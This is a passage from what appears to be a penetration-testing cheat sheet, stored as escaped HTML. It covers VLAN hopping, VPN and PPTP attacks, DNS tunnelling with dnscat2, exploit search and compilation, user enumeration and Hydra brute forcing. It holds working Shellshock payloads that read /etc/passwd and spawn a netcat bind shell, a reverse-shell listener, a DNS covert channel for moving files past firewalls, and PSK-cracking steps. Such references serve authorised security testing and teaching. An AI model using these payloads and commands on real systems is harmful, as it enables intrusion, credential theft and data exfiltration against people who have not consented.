    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/11&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.224.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;2097150 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/10&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.192.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;4194302 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/9&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.128.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;8388606 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/8&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.0.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;16777214 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vlan-hopping&quot;&gt;VLAN Hopping&lt;/h3&gt;

&lt;p&gt;Using NCCGroups VLAN wrapper script for Yersina simplifies the process.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/nccgroup/vlan-hopping.git
chmod 700 frogger.sh
./frogger.sh 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vpn-pentesting-tools&quot;&gt;VPN Pentesting Tools&lt;/h3&gt;

&lt;p&gt;Identify VPN servers:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./udp-protocol-scanner.pl -p ike TARGET(s)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Scan a range for VPN servers:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./udp-protocol-scanner.pl -p ike -f ip.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;ikeforce&quot;&gt;IKEForce&lt;/h4&gt;

&lt;p&gt;Use IKEForce to enumerate or dictionary attack VPN servers.&lt;/p&gt;

&lt;p&gt;Install:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip install pyip
git clone https://github.com/SpiderLabs/ikeforce.git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Perform IKE VPN enumeration with IKEForce:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Bruteforce IKE VPN using IKEForce:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ike-scan
ike-scan TARGET-IP
ike-scan -A TARGET-IP
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;ike-aggressive-mode-psk-cracking&quot;&gt;IKE Aggressive Mode PSK Cracking&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;Identify VPN Servers&lt;/li&gt;
  &lt;li&gt;Enumerate with IKEForce to obtain the group ID&lt;/li&gt;
  &lt;li&gt;Use ike-scan to capture the PSK hash from the IKE endpoint&lt;/li&gt;
  &lt;li&gt;Use psk-crack to crack the hash&lt;/li&gt;
&lt;/ol&gt;

&lt;h5 id=&quot;step-1-idenitfy-ike-servers&quot;&gt;Step 1: Idenitfy IKE Servers&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./udp-protocol-scanner.pl -p ike SUBNET/24
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;step-2-enumerate-group-name-with-ikeforce&quot;&gt;Step 2: Enumerate group name with IKEForce&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;step-3-use-ike-scan-to-capture-the-psk-hash&quot;&gt;Step 3: Use ike-scan to capture the PSK hash&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;step-4-use-psk-crack-to-crack-the-psk-hash&quot;&gt;Step 4: Use psk-crack to crack the PSK hash&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;psk-crack hash-file.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Some more advanced psk-crack options below:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pskcrack
psk-crack -b 5 TARGET-IPkey
psk-crack -b 5 --charset=&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key
psk-crack -d /path/to/dictionary-file TARGET-IP-key
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;pptp-hacking&quot;&gt;PPTP Hacking&lt;/h4&gt;

&lt;p&gt;Identifying PPTP, it listens on TCP: 1723&lt;/p&gt;

&lt;h5 id=&quot;nmap-pptp-fingerprint&quot;&gt;NMAP PPTP Fingerprint:&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap –Pn -sV -p 1723 TARGET(S)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;pptp-dictionary-attack&quot;&gt;PPTP Dictionary Attack&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;dns-tunneling&quot;&gt;DNS Tunneling&lt;/h3&gt;

&lt;p&gt;Tunneling data over DNS to bypass firewalls.&lt;/p&gt;

&lt;p&gt;dnscat2 supports “download” and “upload” commands for getting files (data and programs) to and from the target machine.&lt;/p&gt;

&lt;h4 id=&quot;attacking-machine&quot;&gt;Attacking Machine&lt;/h4&gt;

&lt;p&gt;Installtion:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get update
apt-get -y install ruby-dev git make g++
gem install bundler
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Run dnscat2:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ruby ./dnscat2.rb
dnscat2&amp;gt; New session established: 1422
dnscat2&amp;gt; session -i 1422
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Target Machine:&lt;/p&gt;

&lt;p&gt;https://downloads.skullsecurity.org/dnscat2/
https://github.com/lukebaggett/dnscat2-powershell/&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnscat --host &amp;lt;dnscat server_ip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;bof--exploit&quot;&gt;BOF / Exploit&lt;/h2&gt;

&lt;h2 id=&quot;exploit-research&quot;&gt;Exploit Research&lt;/h2&gt;

&lt;p&gt;Find exploits for enumerated hosts / services.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;searchsploit windows 2003 | grep -i local&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Search exploit-db for exploit, in this example windows 2003 + local esc&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;site:exploit-db.com exploit kernel &amp;lt;= 3&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Use google to search exploit-db.com for exploits&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;grep -R &quot;W7&quot; /usr/share/metasploit-framework&lt;br /&gt;/modules/exploit/windows/*&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Search metasploit modules using grep - msf search sucks a bit&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;searching-for-exploits&quot;&gt;Searching for Exploits&lt;/h3&gt;

&lt;p&gt;Install local copy of exploit-db:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; searchsploit –u
 searchsploit apache 2.2
 searchsploit &quot;Linux Kernel&quot;
 searchsploit linux 2.6 | grep -i ubuntu | grep local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;compiling-windows-exploits-on-kali&quot;&gt;Compiling Windows Exploits on Kali&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
  wine mingw-get-setup.exe
  select mingw32-base
  cd /root/.wine/drive_c/windows
  wget http://gojhonny.com/misc/mingw_bin.zip &amp;amp;&amp;amp; unzip mingw_bin.zip
  cd /root/.wine/drive_c/MinGW/bin
  wine gcc -o ability.exe /tmp/exploit.c -lwsock32
  wine ability.exe  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cross-compiling-exploits&quot;&gt;Cross Compiling Exploits&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;exploiting-common-vulnerabilities&quot;&gt;Exploiting Common Vulnerabilities&lt;/h3&gt;

&lt;h4 id=&quot;exploiting-shellshock&quot;&gt;Exploiting Shellshock&lt;/h4&gt;

&lt;p&gt;A tool to find and exploit servers vulnerable to Shellshock:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/nccgroup/shocker
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./shocker.py -H TARGET  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;cat-file-view-file-contents&quot;&gt;cat file (view file contents)&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(&amp;lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;shell-shock-run-bind-shell&quot;&gt;Shell Shock run bind shell&lt;/h5&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;shell-shock-reverse-shell&quot;&gt;Shell Shock reverse Shell&lt;/h5&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -l -p 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;simple-local-web-servers&quot;&gt;Simple Local Web Servers&lt;/h2&gt;

&lt;p&gt;Python local web server command, handy for serving up shells and exploits on an attacking machine.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
   &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;python -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Run a basic http server, great for serving up shells etc&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

        &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;python3 -m http.server&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Run a basic Python3 http server, great for serving up shells etc&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

        &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ruby -rwebrick -e &quot;WEBrick::HTTPServer.new&lt;br /&gt;(:Port =&amp;gt; 80, :DocumentRoot =&amp;gt; Dir.pwd).start&quot;&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Run a ruby webrick basic http server&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

        &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;php -S 0.0.0.0:80&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Run a basic PHP http server&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;mounting-file-shares&quot;&gt;Mounting File Shares&lt;/h2&gt;

&lt;p&gt;How to mount NFS / CIFS, Windows and Linux file shares.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
   &lt;tbody&gt;
     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;mount 192.168.1.1:/vol/share /mnt/nfs&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Mount NFS share to &lt;code&gt;/mnt/nfs&lt;/code&gt; &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;mount -t cifs -o username=user,password=pass&lt;br /&gt;,domain=blah //192.168.1.X/share-name /mnt/cifs&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Mount Windows CIFS / SMB share on Linux at &lt;code&gt;/mnt/cifs&lt;/code&gt; if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
          &lt;p&gt;&lt;code&gt;net use Z: \\win-server\share password &lt;br /&gt; /user:domain\janedoe /savecred /p:no&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Mount a Windows share on Windows from the command line&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;apt-get install smb4k -y&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Install smb4k on Kali, useful Linux GUI for browsing SMB shares&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;http--https-webserver-enumeration&quot;&gt;HTTP / HTTPS Webserver Enumeration&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nikto -h 192.168.1.1&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Perform a nikto scan against target&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dirbuster&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Configure via GUI, CLI input doesn't work most of the time&lt;/p&gt;
      &lt;/td&gt;
   &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;packet-inspection&quot;&gt;Packet Inspection&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tcpdump tcp port 80 -w output.pcap -i eth0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;tcpdump for port 80 on interface eth0, outputs to output.pcap&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;username-enumeration&quot;&gt;Username Enumeration&lt;/h2&gt;

&lt;p&gt;Some techniques used to remotely enumerate users on a target system.&lt;/p&gt;

&lt;h3 id=&quot;smb-user-enumeration&quot;&gt;SMB User Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;python /usr/share/doc/python-impacket-doc/examples&lt;br /&gt;/samrdump.py 192.168.XXX.XXX&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Enumerate users from SMB&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ridenum.py 192.168.XXX.XXX 500 50000 dict.txt&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;RID cycle SMB / enumerate users from SMB&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;snmp-user-enumeration&quot;&gt;SNMP User Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;

  &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 &lt;br /&gt;|cut -d” “ -f4&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Enmerate users from SNMP&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;python /usr/share/doc/python-impacket-doc/examples/&lt;br /&gt;samrdump.py SNMP 192.168.X.XXX&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Enmerate users from SNMP&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt &lt;br /&gt;(then grep)&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Search for SNMP servers with nmap, grepable output&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;




&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;passwords&quot;&gt;Passwords&lt;/h2&gt;

&lt;h3 id=&quot;wordlists&quot;&gt;Wordlists&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
	&lt;p&gt;&lt;code&gt;/usr/share/wordlists&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Kali word lists&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;brute-forcing-services&quot;&gt;Brute Forcing Services&lt;/h2&gt;

&lt;h3 id=&quot;hydra-ftp-brute-force&quot;&gt;Hydra FTP Brute Force&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
	&lt;p&gt;&lt;code&gt;hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f &lt;br /&gt;192.168.X.XXX ftp -V&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Hydra FTP brute force&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;hydra-pop3-brute-force&quot;&gt;Hydra POP3 Brute Force&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
	&lt;p&gt;&lt;code&gt;hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f &lt;br /&gt;192.168.X.XXX pop3 -V&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Hydra POP3 brute force&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;hydra-smtp-brute-force&quot;&gt;Hydra SMTP Brute Force&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
	&lt;p&gt;&lt;code&gt;hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Hydra SMTP brute force&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;Use &lt;code&gt;-t&lt;/code&gt; to limit concurrent connections, example: &lt;code&gt;-t 15&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;password-cracking&quot;&gt;Password Cracking&lt;/h2&gt;

&lt;p&gt;Password cracking penetration testing tools.&lt;/p&gt;

&lt;h3 id=&quot;john-the-ripper---jtr&quot;&gt;John The Ripper - JTR&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
